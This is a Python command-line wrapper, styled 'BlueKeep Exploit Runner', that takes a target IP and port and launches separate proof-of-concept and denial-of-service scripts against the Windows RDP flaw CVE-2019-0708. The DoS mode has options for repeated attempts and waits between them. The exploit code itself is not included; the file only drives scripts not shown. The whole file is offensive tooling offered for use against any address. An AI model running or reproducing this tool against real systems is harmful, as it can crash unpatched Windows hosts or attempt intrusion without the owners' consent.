#!/usr/bin/env python3

import os
import sys
import argparse
import subprocess
from pathlib import Path

def run_poc_exploit(target_ip, port=3389, verbose=False):
    """Run the BlueKeep PoC exploit against the target IP."""
    print(f"[*] Running BlueKeep PoC exploit against target: {target_ip}:{port}")
    
    exploit_path = Path("bluekeep_poc.py")
    if not exploit_path.exists():
        print("[-] Exploit script not found!")
        return False
    
    cmd = ["python3", str(exploit_path), "-i", target_ip]
    if port != 3389:
        cmd.extend(["-p", str(port)])
    
    try:
        # Run the process and capture its output
        process = subprocess.run(
            cmd, 
            check=False,  # Don't raise exception on non-zero exit
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Print the output
        print(process.stdout)
        if process.stderr:
            print(process.stderr)
        
        # Check for connection errors in the output
        if "Connection reset by peer" in process.stdout or "unable to connect" in process.stdout:
            print("[-] Connection failed: The target rejected or reset the connection")
            return False
        
        # Check if any targets were identified
        if "starting RDP connection on 0 targets" in process.stdout:
            print("[-] No valid RDP targets identified")
            return False
        
        # Check for success indicators
        if "successfully connected to RDP service" in process.stdout:
            return True
            
        # Check the return code
        if process.returncode != 0:
            print(f"[-] Exploit exited with code: {process.returncode}")
            return False
            
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Exploit failed with error: {e}")
        return False
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
        return False

def run_dos_exploit(target_ip, port=3389, arch=64, dos_times=1, wait_time=0, verbose=False):
    """Run the BlueKeep DoS exploit against the target IP."""
    print(f"[*] Running BlueKeep DoS exploit against target: {target_ip}:{port}")
    
    exploit_path = Path("bluekeep_dos.py")
    if not exploit_path.exists():
        print("[-] DoS exploit script not found!")
        return False
    
    cmd = ["python3", str(exploit_path), "-i", target_ip]
    if port != 3389:
        cmd.extend(["-p", str(port)])
    
    cmd.extend(["-a", str(arch)])
    cmd.extend(["-t", str(dos_times)])
    cmd.extend(["-w", str(wait_time)])
    
    if verbose:
        cmd.append("-v")
    
    try:
        subprocess.run(cmd, check=True)
        return True
    except subprocess.CalledProcessError:
        print("[-] DoS exploit failed!")
        return False
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
        return False

def main():
    banner = """
    ____  __           __ __                 
   / __ )/ /_  _____  / //_/__  ___ ____     
  / __  / / / / / _ \/ ,< / _ \/ -_) __/     
 /_/ /_/_/\_,_/_//_/_/|_|\___/\__/_/        
                                              
 CVE-2019-0708 Exploit Runner (LOCAL VERSION)
 Target: Windows 2003/XP/Vista/7/Server 2008
 """
    
    print(banner)
    
    parser = argparse.ArgumentParser(description="BlueKeep Exploit Runner (LOCAL VERSION)")
    parser.add_argument("-i", "--ip", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=3389, help="Target port (default: 3389)")
    parser.add_argument("-m", "--mode", choices=["poc", "dos"], default="poc", 
                        help="Exploit mode: 'poc' for proof of concept or 'dos' for denial of service (default: poc)")
    parser.add_argument("-a", "--arch", type=int, choices=[32, 64], default=64, 
                        help="Target architecture, 32 or 64 bit (default: 64, only used in DoS mode)")
    parser.add_argument("-t", "--times", type=int, default=1, 
                        help="Number of DoS attempts (default: 1, only used in DoS mode)")
    parser.add_argument("-w", "--wait", type=int, default=0, 
                        help="Wait time between DoS attempts in seconds (default: 0, only used in DoS mode)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()
    
    # Display chosen configuration
    print(f"[*] Target: {args.ip}:{args.port}")
    print(f"[*] Mode: {args.mode.upper()}")
    if args.mode == "dos":
        print(f"[*] Architecture: {args.arch}-bit")
        print(f"[*] DoS attempts: {args.times}")
        print(f"[*] Wait time: {args.wait} seconds")
    print(f"[*] Verbose: {'Yes' if args.verbose else 'No'}")
    print()
    
    print("[*] Using LOCAL VERSION: This script assumes required packages are already installed")
    print("[*] Required: Python3, OpenSSL, Impacket\n")
    
    try:
        # Run appropriate exploit based on mode
        if args.mode == "poc":
            success = run_poc_exploit(args.ip, args.port, args.verbose)
        else:  # dos mode
            success = run_dos_exploit(args.ip, args.port, args.arch, args.times, args.wait, args.verbose)
        
        if success:
            print("\n[+] Exploit completed successfully!")
        else:
            print("\n[-] Exploit failed!")
            
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] An unexpected error occurred: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
